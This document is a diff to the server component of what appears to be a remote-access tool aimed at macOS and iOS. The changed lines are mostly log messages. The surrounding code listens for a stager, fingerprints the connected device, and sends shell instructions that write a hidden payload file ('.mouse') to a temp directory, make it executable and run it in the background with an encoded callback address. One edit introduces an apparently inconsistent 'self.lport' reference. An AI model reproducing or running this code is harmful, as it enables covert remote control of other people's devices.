@@ -77,10 +77,10 @@ class Server:
                 try:
                     lport = int(lport)
                 except ValueError:
-                    h.info_error("Invalid port!")
+                    h.info_error("Invalid port, please enter a valid integer.")
                     continue
                 if lport < 1024:
-                    h.info_error("Invalid port!")
+                    h.info_error("Invalid port, please enter a value >= 1024.")
                     continue
                 break
             self.host = socket.gethostbyname(lhost)
@@ -120,8 +120,8 @@ class Server:
             return
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
-            self.verbose_print("Connecting to macOS...")
-            self.verbose_print("Sending macOS payload...")
+            h.info_general("Connecting to macOS...")
+            h.info_general("Sending macOS payload...")
             f = open("data/payloads/macos", "rb")
             payload = f.read()
             f.close()
@@ -130,11 +130,11 @@ class Server:
             "cat >/private/tmp/.mouse;"+\
             "chmod +x /private/tmp/.mouse;"+\
             "/private/tmp/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
-            self.verbose_print("Executing macOS payload...")
+            h.info_general("Executing macOS payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
-            self.verbose_print("Connecting to iOS...")
-            self.verbose_print("Sending iOS payload...")
+            h.info_general("Connecting to iOS...")
+            h.info_general("Sending iOS payload...")
             f = open("data/payloads/ios", "rb")
             payload = f.read()
             f.close()
@@ -142,7 +142,7 @@ class Server:
             "cat >/private/var/tmp/.mouse;"+\
             "chmod +x /private/var/tmp/.mouse;"+\
             "/private/var/tmp/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
-            self.verbose_print("Executing iOS payload...") 
+            h.info_general("Executing iOS payload...")
             return (instructions,payload)
         else:
             h.info_error("Target device is not recognized!")
@@ -151,7 +151,7 @@ class Server:
     def listen_for_stager(self):
         identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
-        h.info_general("Binding to "+self.host+":"+str(self.port)+"...")
+        h.info_general("Binding to "+self.host+":"+str(self.lport)+"...")
         sr = os.system("ping -c 1 "+self.host+" >/dev/null 2>&1")
         if sr != 0:
             h.info_error("Failed to bind to "+self.host+":"+str(self.port)+"!")
@@ -160,7 +160,7 @@ class Server:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', self.port))
         s.listen(1)
-        self.verbose_print("Listening on port "+str(self.port)+"...")
+        h.info_general("Listening on port "+str(self.port)+"...")
         try:
             conn, addr = s.accept()
         except KeyboardInterrupt:
@@ -168,7 +168,7 @@ class Server:
             return
 
         hostAddress = addr[0]
-        self.verbose_print("Connecting to "+hostAddress+"...")
+        h.info_general("Connecting to "+hostAddress+"...")
         conn.send(identification_shell_command.encode())
         try:
             device_arch = conn.recv(128).decode().strip()
@@ -187,7 +187,7 @@ class Server:
 
         conn.send(executable)
         conn.close()
-        self.verbose_print("Establishing connection...")
+        h.info_general("Establishing connection...")
 
         try:
             return self.listen_for_executable_payload(s)
